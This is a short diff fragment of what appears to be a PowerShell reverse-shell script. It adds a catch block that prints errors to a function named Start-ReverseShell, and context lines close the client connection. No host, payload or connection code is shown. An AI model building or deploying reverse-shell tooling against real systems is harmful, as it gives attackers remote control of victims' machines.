@@ -35,6 +35,9 @@ Function Start-ReverseShell {
             $stream.Flush()
         }
     }
+    catch {
+        Write-Host "Error: $_"
+    }
     finally {
         # Close the connection
         if ($client) {
